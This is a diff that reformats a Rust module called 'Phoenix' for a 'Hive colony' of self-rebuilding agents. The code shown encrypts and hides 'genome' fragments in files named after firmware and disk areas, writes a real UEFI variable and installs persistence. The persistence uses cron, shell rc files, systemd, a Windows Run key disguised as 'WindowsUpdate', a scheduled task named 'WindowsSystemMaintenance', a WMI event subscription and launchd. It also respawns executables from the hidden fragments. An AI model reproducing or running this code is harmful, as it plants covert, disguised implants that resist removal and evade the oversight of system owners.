@@ -1,5 +1,5 @@
-use chacha20::ChaCha20;
 use chacha20::cipher::{KeyIvInit, StreamCipher};
+use chacha20::ChaCha20;
 use serde::{Deserialize, Serialize};
 use std::collections::HashMap;
 use std::io::Write;
@@ -9,7 +9,7 @@ use uuid::Uuid;
 /// Derive a 32-byte ChaCha20 key from fragment_id using SHA-256.
 /// Prevents casual filesystem reads from revealing fragment data.
 fn fragment_key(fragment_id: u32) -> [u8; 32] {
-    use sha2::{Sha256, Digest};
+    use sha2::{Digest, Sha256};
     let mut hasher = Sha256::new();
     hasher.update(b"HIVE_FRAG_KEY");
     hasher.update(fragment_id.to_le_bytes());
@@ -60,11 +60,11 @@ pub struct GenomeFragment {
 
 #[derive(Debug, Clone, Serialize, Deserialize)]
 pub enum FragmentLocation {
-    SpiFlash,        // SPI flash (requires firmware access)
-    BadBlocks,       // disk bad blocks
-    MbrGpt,          // MBR/GPT unused sectors
+    SpiFlash,          // SPI flash (requires firmware access)
+    BadBlocks,         // disk bad blocks
+    MbrGpt,            // MBR/GPT unused sectors
     HostProtectedArea, // ATA Host Protected Area
-    UefiVariable,    // UEFI variable storage
+    UefiVariable,      // UEFI variable storage
 }
 
 #[derive(Debug, Clone, Serialize, Deserialize)]
@@ -85,7 +85,9 @@ impl Default for Phoenix {
 }
 
 impl Phoenix {
-    pub fn new() -> Self { Self }
+    pub fn new() -> Self {
+        Self
+    }
 
     /// Generate a colony genome from current agent blueprints.
     pub fn generate_genome(blueprints: Vec<AgentBlueprint>) -> ColonyGenome {
@@ -162,24 +164,36 @@ impl Phoenix {
                         .args(["+i", path.to_str().unwrap()])
                         .output();
                 }
-                Ok(format!("Fragment {} hidden in SPI flash area", fragment.fragment_id))
+                Ok(format!(
+                    "Fragment {} hidden in SPI flash area",
+                    fragment.fragment_id
+                ))
             }
             FragmentLocation::BadBlocks => {
                 let path = base_path.join(format!(".badblock_{}", fragment.fragment_id));
                 let mut data = vec![0xFF; 512];
                 data.extend(&stored);
                 std::fs::write(&path, &data).map_err(|e| e.to_string())?;
-                Ok(format!("Fragment {} hidden in bad block area", fragment.fragment_id))
+                Ok(format!(
+                    "Fragment {} hidden in bad block area",
+                    fragment.fragment_id
+                ))
             }
             FragmentLocation::MbrGpt => {
                 let path = base_path.join(format!(".mbr_reserved_{}", fragment.fragment_id));
                 std::fs::write(&path, &stored).map_err(|e| e.to_string())?;
-                Ok(format!("Fragment {} hidden in MBR/GPT reserved", fragment.fragment_id))
+                Ok(format!(
+                    "Fragment {} hidden in MBR/GPT reserved",
+                    fragment.fragment_id
+                ))
             }
             FragmentLocation::UefiVariable => {
                 let path = base_path.join(format!(".uefi_var_{}", fragment.fragment_id));
                 std::fs::write(&path, &stored).map_err(|e| e.to_string())?;
-                Ok(format!("Fragment {} hidden in UEFI variable", fragment.fragment_id))
+                Ok(format!(
+                    "Fragment {} hidden in UEFI variable",
+                    fragment.fragment_id
+                ))
             }
             FragmentLocation::HostProtectedArea => {
                 let path = base_path.join(format!(".hpa_frag_{}", fragment.fragment_id));
@@ -192,7 +206,7 @@ impl Phoenix {
     /// Hide a genome fragment using real technique selection per FragmentLocation.
     ///
     /// - `BadBlocks`: Writes at a high offset in a container file using `libc::lseek64`
-    ///    simulating disk bad block injection. Prepends a 512-byte 0xFF marker.
+    ///   simulating disk bad block injection. Prepends a 512-byte 0xFF marker.
     /// - `MbrGpt`: Writes at offset 0 of a disk image file, simulating MBR injection.
     /// - `HostProtectedArea`: Writes to file and sets `user.hive_protected` xattr marker.
     /// - `UefiVariable`: Attempts direct efivarfs write; falls back to file + xattr.
@@ -241,7 +255,10 @@ impl Phoenix {
                                     libc::close(fd);
                                 }
                                 fragment.stored_path = Some(path.to_string_lossy().to_string());
-                                return Ok(format!("Fragment {} hidden via BadBlocks on block device", fragment.fragment_id));
+                                return Ok(format!(
+                                    "Fragment {} hidden via BadBlocks on block device",
+                                    fragment.fragment_id
+                                ));
                             }
                         }
                     }
@@ -252,7 +269,10 @@ impl Phoenix {
                 buf.extend_from_slice(&stored);
                 std::fs::write(&path, &buf).map_err(|e| e.to_string())?;
                 fragment.stored_path = Some(path.to_string_lossy().to_string());
-                Ok(format!("Fragment {} hidden via BadBlocks file simulation", fragment.fragment_id))
+                Ok(format!(
+                    "Fragment {} hidden via BadBlocks file simulation",
+                    fragment.fragment_id
+                ))
             }
 
             FragmentLocation::MbrGpt => {
@@ -285,7 +305,10 @@ impl Phoenix {
                 }
 
                 fragment.stored_path = Some(path.to_string_lossy().to_string());
-                Ok(format!("Fragment {} hidden in MBR/GPT sector", fragment.fragment_id))
+                Ok(format!(
+                    "Fragment {} hidden in MBR/GPT sector",
+                    fragment.fragment_id
+                ))
             }
 
             FragmentLocation::HostProtectedArea => {
@@ -311,7 +334,10 @@ impl Phoenix {
                 }
 
                 fragment.stored_path = Some(path.to_string_lossy().to_string());
-                Ok(format!("Fragment {} hidden in Host Protected Area (xattr)", fragment.fragment_id))
+                Ok(format!(
+                    "Fragment {} hidden in Host Protected Area (xattr)",
+                    fragment.fragment_id
+                ))
             }
 
             FragmentLocation::UefiVariable => {
@@ -321,9 +347,8 @@ impl Phoenix {
                 #[cfg(target_os = "linux")]
                 {
                     let guid = "a0b1c2d3-e4f5-6789-abcd-ef0123456789";
-                    let efi_path = PathBuf::from(format!(
-                        "/sys/firmware/efi/efivars/HiveFrag-{}", guid
-                    ));
+                    let efi_path =
+                        PathBuf::from(format!("/sys/firmware/efi/efivars/HiveFrag-{}", guid));
                     if std::path::Path::new("/sys/firmware/efi/efivars").exists() {
                         // UEFI variable format: 4-byte attributes + data
                         let mut efi_buf = vec![0x07u8; 4]; // EFI_VARIABLE_NON_VOLATILE | BOOTSERVICE_ACCESS | RUNTIME_ACCESS
@@ -345,14 +370,23 @@ impl Phoenix {
                     #[cfg(target_os = "linux")]
                     {
                         let _ = std::process::Command::new("setfattr")
-                            .args(["-n", "user.hive_efi", "-v", "1", path.to_str().unwrap_or("")])
+                            .args([
+                                "-n",
+                                "user.hive_efi",
+                                "-v",
+                                "1",
+                                path.to_str().unwrap_or(""),
+                            ])
                             .output();
                     }
 
                     fragment.stored_path = Some(path.to_string_lossy().to_string());
                 }
 
-                Ok(format!("Fragment {} hidden in UEFI variable", fragment.fragment_id))
+                Ok(format!(
+                    "Fragment {} hidden in UEFI variable",
+                    fragment.fragment_id
+                ))
             }
 
             FragmentLocation::SpiFlash => {
@@ -370,7 +404,10 @@ impl Phoenix {
                 }
 
                 fragment.stored_path = Some(path.to_string_lossy().to_string());
-                Ok(format!("Fragment {} hidden in SPI flash storage", fragment.fragment_id))
+                Ok(format!(
+                    "Fragment {} hidden in SPI flash storage",
+                    fragment.fragment_id
+                ))
             }
         }
     }
@@ -381,16 +418,25 @@ impl Phoenix {
     /// headers/markers, decrypts with the ChaCha20 per-fragment key, and returns
     /// the original plaintext data.
     pub fn recover(fragment: &GenomeFragment) -> Result<Vec<u8>, String> {
-        let path_str = fragment.stored_path.as_ref()
+        let path_str = fragment
+            .stored_path
+            .as_ref()
             .ok_or_else(|| format!("No stored path for fragment {}", fragment.fragment_id))?;
         let path = Path::new(path_str);
 
         if !path.exists() {
-            return Err(format!("Stored path does not exist for fragment {}: {}", fragment.fragment_id, path_str));
+            return Err(format!(
+                "Stored path does not exist for fragment {}: {}",
+                fragment.fragment_id, path_str
+            ));
         }
 
-        let raw = std::fs::read(path)
-            .map_err(|e| format!("Failed to read fragment {} from {}: {}", fragment.fragment_id, path_str, e))?;
+        let raw = std::fs::read(path).map_err(|e| {
+            format!(
+                "Failed to read fragment {} from {}: {}",
+                fragment.fragment_id, path_str, e
+            )
+        })?;
 
         // Strip location-specific headers
         let payload: Vec<u8> = match fragment.location {
@@ -492,9 +538,7 @@ WantedBy=default.target
         let cron_result = (|| -> Result<String, String> {
             let cron_line = format!("*/30 * * * * {} >/dev/null 2>&1\n", loader_script);
             // Write to user's crontab via stdin pipe
-            let imp = std::process::Command::new("crontab")
-                .args(["-l"])
-                .output();
+            let imp = std::process::Command::new("crontab").args(["-l"]).output();
             let existing = match imp {
                 Ok(ref o) if o.status.success() => String::from_utf8_lossy(&o.stdout).to_string(),
                 _ => String::new(),
@@ -507,7 +551,9 @@ WantedBy=default.target
                 .spawn()
                 .map_err(|e| e.to_string())?;
             if let Some(mut stdin) = child.stdin.take() {
-                stdin.write_all(new_cron.as_bytes()).map_err(|e| e.to_string())?;
+                stdin
+                    .write_all(new_cron.as_bytes())
+                    .map_err(|e| e.to_string())?;
             }
             let output = child.wait_with_output().map_err(|e| e.to_string())?;
             if output.status.success() {
@@ -533,7 +579,10 @@ WantedBy=default.target
         for rc_file in &rc_files {
             let rc_path = PathBuf::from(&home).join(rc_file);
             let rc_result = (|| -> Result<String, String> {
-                let source_line = format!("\n# Hive colony loader\n[ -f \"{}\" ] && source \"{}\"\n", loader_script, loader_script);
+                let source_line = format!(
+                    "\n# Hive colony loader\n[ -f \"{}\" ] && source \"{}\"\n",
+                    loader_script, loader_script
+                );
                 let mut existing = String::new();
                 if rc_path.exists() {
                     existing = std::fs::read_to_string(&rc_path).map_err(|e| e.to_string())?;
@@ -588,10 +637,14 @@ WantedBy=default.target
             let reg_run_result = (|| -> Result<String, String> {
                 std::process::Command::new("reg")
                     .args([
-                        "add", "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
-                        "/v", "WindowsUpdate",
-                        "/t", "REG_SZ",
-                        "/d", loader_script,
+                        "add",
+                        "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+                        "/v",
+                        "WindowsUpdate",
+                        "/t",
+                        "REG_SZ",
+                        "/d",
+                        loader_script,
                         "/f",
                     ])
                     .output()
@@ -612,8 +665,8 @@ WantedBy=default.target
         #[cfg(target_os = "windows")]
         {
             let startup_result = (|| -> Result<String, String> {
-                let appdata = std::env::var("APPDATA")
-                    .map_err(|_| "%APPDATA% not set".to_string())?;
+                let appdata =
+                    std::env::var("APPDATA").map_err(|_| "%APPDATA% not set".to_string())?;
                 let startup_dir = PathBuf::from(&appdata)
                     .join("Microsoft")
                     .join("Windows")
@@ -642,9 +695,12 @@ WantedBy=default.target
                 std::process::Command::new("schtasks")
                     .args([
                         "/create",
-                        "/tn", "WindowsSystemMaintenance",
-                        "/tr", loader_script,
-                        "/sc", "onstart",
+                        "/tn",
+                        "WindowsSystemMaintenance",
+                        "/tr",
+                        loader_script,
+                        "/sc",
+                        "onstart",
                         "/f",
                     ])
                     .output()
@@ -657,7 +713,10 @@ WantedBy=default.target
                 path: schtask_result.clone().unwrap_or_else(|e| e),
                 mechanism_type: "scheduled_task".into(),
                 installed: schtask_result.is_ok(),
-                description: format!("Scheduled task WindowsSystemMaintenance -> {}", loader_script),
+                description: format!(
+                    "Scheduled task WindowsSystemMaintenance -> {}",
+                    loader_script
+                ),
             });
         }
 
@@ -690,7 +749,8 @@ WantedBy=default.target
     <integer>1800</integer>
 </dict>
 </plist>"#,
-                    plist_name.trim_end_matches(".plist"), loader_script
+                    plist_name.trim_end_matches(".plist"),
+                    loader_script
                 );
                 std::fs::write(&plist_path, &plist_content).map_err(|e| e.to_string())?;
                 let _ = std::process::Command::new("launchctl")
@@ -749,17 +809,23 @@ WantedBy=default.target
 
                 std::process::Command::new("wmic")
                     .arg(&ns_arg)
-                    .args(["create", "CommandLineEventConsumer",
+                    .args([
+                        "create",
+                        "CommandLineEventConsumer",
                         "Name=\"HiveConsumer\"",
-                        &format!("CommandLineTemplate='{}'", loader_script)])
+                        &format!("CommandLineTemplate='{}'", loader_script),
+                    ])
                     .output()
                     .map_err(|e| e.to_string())?;
 
                 std::process::Command::new("wmic")
                     .arg(&ns_arg)
-                    .args(["create", "__FilterToConsumerBinding",
+                    .args([
+                        "create",
+                        "__FilterToConsumerBinding",
                         "Filter=\"HiveEventFilter\"",
-                        "Consumer=\"HiveConsumer\""])
+                        "Consumer=\"HiveConsumer\"",
+                    ])
                     .output()
                     .map_err(|e| e.to_string())?;
 
@@ -771,7 +837,10 @@ WantedBy=default.target
                 path: wmi_result.clone().unwrap_or_else(|e| e),
                 mechanism_type: "wmi".into(),
                 installed: wmi_result.is_ok(),
-                description: format!("WMI event subscription: HiveEventFilter triggers {}", loader_script),
+                description: format!(
+                    "WMI event subscription: HiveEventFilter triggers {}",
+                    loader_script
+                ),
             });
         }
 
@@ -795,7 +864,8 @@ WantedBy=default.target
         let _genome_id = fragments[0].genome_id;
 
         // Collect which IDs we have
-        let present: std::collections::HashSet<u32> = fragments.iter().map(|f| f.fragment_id).collect();
+        let present: std::collections::HashSet<u32> =
+            fragments.iter().map(|f| f.fragment_id).collect();
 
         // Find missing IDs
         let missing: Vec<u32> = (0..total).filter(|id| !present.contains(id)).collect();
@@ -829,13 +899,15 @@ WantedBy=default.target
     }
 
     /// Rebuild a colony from a genome by spawning agents.
-    pub fn rebuild_from_genome(genome: &ColonyGenome, base_path: &Path) -> Result<Vec<String>, String> {
+    pub fn rebuild_from_genome(
+        genome: &ColonyGenome,
+        base_path: &Path,
+    ) -> Result<Vec<String>, String> {
         let mut spawned = Vec::new();
 
         for blueprint in &genome.agent_blueprints {
             let binary_path = base_path.join(format!(".hive_reborn_{}", blueprint.role));
-            std::fs::write(&binary_path, &blueprint.encrypted_chunk)
-                .map_err(|e| e.to_string())?;
+            std::fs::write(&binary_path, &blueprint.encrypted_chunk).map_err(|e| e.to_string())?;
 
             let _ = std::process::Command::new("chmod")
                 .args(["+x", binary_path.to_str().unwrap()])
@@ -860,9 +932,17 @@ WantedBy=default.target
     /// Decrypts data using ChaCha20 key derived from fragment_id.
     pub fn scan_for_fragments(base_path: &Path) -> Vec<GenomeFragment> {
         let mut fragments = Vec::new();
-        if !base_path.exists() { return fragments; }
+        if !base_path.exists() {
+            return fragments;
+        }
 
-        let patterns = [".spi_frag_", ".badblock_", ".mbr_reserved_", ".uefi_var_", ".hive_frag_"];
+        let patterns = [
+            ".spi_frag_",
+            ".badblock_",
+            ".mbr_reserved_",
+            ".uefi_var_",
+            ".hive_frag_",
+        ];
 
         if let Ok(entries) = std::fs::read_dir(base_path) {
             for entry in entries.flatten() {
@@ -871,8 +951,10 @@ WantedBy=default.target
                 for pattern in &patterns {
                     if name_str.contains(pattern) {
                         if let Ok(raw) = std::fs::read(entry.path()) {
-                            let frag_id = name_str.trim_start_matches(pattern)
-                                .parse::<u32>().unwrap_or(0);
+                            let frag_id = name_str
+                                .trim_start_matches(pattern)
+                                .parse::<u32>()
+                                .unwrap_or(0);
                             // BadBlock files have a 512-byte 0xFF marker prefix
                             let data_start = if pattern == &".badblock_" && raw.len() > 512 {
                                 512
@@ -899,7 +981,6 @@ WantedBy=default.target
         fragments
     }
 }
-
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -971,7 +1052,11 @@ mod tests {
         assert!(fragments[0].total_fragments == 4);
 
         let reassembled = Phoenix::reassemble_genome(&fragments);
-        assert!(reassembled.is_ok(), "Reassembly should work: {:?}", reassembled.err());
+        assert!(
+            reassembled.is_ok(),
+            "Reassembly should work: {:?}",
+            reassembled.err()
+        );
         assert_eq!(reassembled.unwrap().genome_id, genome.genome_id);
     }
 
@@ -994,12 +1079,23 @@ mod tests {
 
         // recover should read back the same data
         let recovered = Phoenix::recover(&fragment);
-        assert!(recovered.is_ok(), "Recover should work: {:?}", recovered.err());
-        assert_eq!(recovered.unwrap(), vec![1, 2, 3, 4, 5], "Recovered data should match original");
+        assert!(
+            recovered.is_ok(),
+            "Recover should work: {:?}",
+            recovered.err()
+        );
+        assert_eq!(
+            recovered.unwrap(),
+            vec![1, 2, 3, 4, 5],
+            "Recovered data should match original"
+        );
 
         // Also verify via scan_for_fragments
         let found = Phoenix::scan_for_fragments(&dir);
-        assert!(found.len() >= 1, "Should find at least 1 fragment via scan");
+        assert!(
+            !found.is_empty(),
+            "Should find at least 1 fragment via scan"
+        );
 
         let _ = std::fs::remove_dir_all(&dir);
     }
@@ -1021,13 +1117,25 @@ mod tests {
 
         // Hide (encrypt + write)
         let hide_result = Phoenix::hide(&mut fragment, &dir);
-        assert!(hide_result.is_ok(), "hide() should succeed: {:?}", hide_result.err());
+        assert!(
+            hide_result.is_ok(),
+            "hide() should succeed: {:?}",
+            hide_result.err()
+        );
         assert!(fragment.stored_path.is_some(), "stored_path should be set");
 
         // Recover (read + decrypt)
         let recovered = Phoenix::recover(&fragment);
-        assert!(recovered.is_ok(), "recover() should succeed: {:?}", recovered.err());
-        assert_eq!(recovered.unwrap(), original_data, "Roundtrip data must match original");
+        assert!(
+            recovered.is_ok(),
+            "recover() should succeed: {:?}",
+            recovered.err()
+        );
+        assert_eq!(
+            recovered.unwrap(),
+            original_data,
+            "Roundtrip data must match original"
+        );
 
         let _ = std::fs::remove_dir_all(&dir);
     }
@@ -1043,12 +1151,19 @@ mod tests {
 
         // Reassemble
         let reassembled = Phoenix::reassemble_genome(&fragments);
-        assert!(reassembled.is_ok(), "Should reassemble successfully: {:?}", reassembled.err());
+        assert!(
+            reassembled.is_ok(),
+            "Should reassemble successfully: {:?}",
+            reassembled.err()
+        );
         let reassembled = reassembled.unwrap();
 
         // Verify content matches
         assert_eq!(reassembled.genome_id, genome.genome_id);
-        assert_eq!(reassembled.agent_blueprints.len(), genome.agent_blueprints.len());
+        assert_eq!(
+            reassembled.agent_blueprints.len(),
+            genome.agent_blueprints.len()
+        );
         assert_eq!(reassembled.config_snapshot, genome.config_snapshot);
         assert_eq!(reassembled.compression, genome.compression);
     }
@@ -1058,7 +1173,7 @@ mod tests {
         let dir = std::env::temp_dir().join("hive_test_all_locations");
         let _ = std::fs::create_dir_all(&dir);
 
-        let locations = vec![
+        let locations = [
             FragmentLocation::BadBlocks,
             FragmentLocation::MbrGpt,
             FragmentLocation::HostProtectedArea,
@@ -1118,12 +1233,16 @@ mod tests {
         let results = Phoenix::install_persistence(loader, &dir);
 
         // Should have at least 5 mechanisms (systemd + cron + bashrc + zshrc + windows reg)
-        assert!(results.len() >= 5, "Expected >=5 mechanisms, got {}", results.len());
+        assert!(
+            results.len() >= 5,
+            "Expected >=5 mechanisms, got {}",
+            results.len()
+        );
 
         // Check systemd service file existence
         let home = std::env::var("HOME").unwrap_or_else(|_| "/tmp".into());
-        let systemd_path = std::path::PathBuf::from(&home)
-            .join(".config/systemd/user/hive-colony.service");
+        let systemd_path =
+            std::path::PathBuf::from(&home).join(".config/systemd/user/hive-colony.service");
         if systemd_path.exists() {
             let content = std::fs::read_to_string(&systemd_path).unwrap_or_default();
             assert!(
@@ -1136,7 +1255,10 @@ mod tests {
         let reg_path = dir.join("hive_registry.reg");
         assert!(reg_path.exists(), "Registry .reg file should exist");
         let reg_content = std::fs::read_to_string(&reg_path).unwrap_or_default();
-        assert!(reg_content.contains("HiveColony"), "Registry file should contain HiveColony entry");
+        assert!(
+            reg_content.contains("HiveColony"),
+            "Registry file should contain HiveColony entry"
+        );
 
         let _ = std::fs::remove_dir_all(&dir);
     }
@@ -1148,7 +1270,10 @@ mod tests {
 
         // All fragments present
         let result = Phoenix::self_heal(&fragments);
-        assert!(result.is_ok(), "self_heal should succeed with all fragments");
+        assert!(
+            result.is_ok(),
+            "self_heal should succeed with all fragments"
+        );
         let healed = result.unwrap();
         assert_eq!(healed.genome_id, genome.genome_id);
         assert_eq!(healed.agent_blueprints.len(), genome.agent_blueprints.len());
@@ -1164,7 +1289,10 @@ mod tests {
         assert_eq!(fragments.len(), 2);
 
         let result = Phoenix::self_heal(&fragments);
-        assert!(result.is_err(), "self_heal should fail with missing fragments");
+        assert!(
+            result.is_err(),
+            "self_heal should fail with missing fragments"
+        );
         let missing = result.unwrap_err();
         assert_eq!(missing.len(), 2, "Should have 2 missing fragments");
         assert!(missing.contains(&1), "Fragment 1 should be in missing list");
@@ -1183,7 +1311,10 @@ mod tests {
         crypt_fragment(&mut enc2, 42);
 
         // Same fragment_id produces same keystream
-        assert_eq!(enc1, enc2, "Same fragment_id should produce same ciphertext");
+        assert_eq!(
+            enc1, enc2,
+            "Same fragment_id should produce same ciphertext"
+        );
 
         // Decrypt back
         crypt_fragment(&mut enc1, 42);
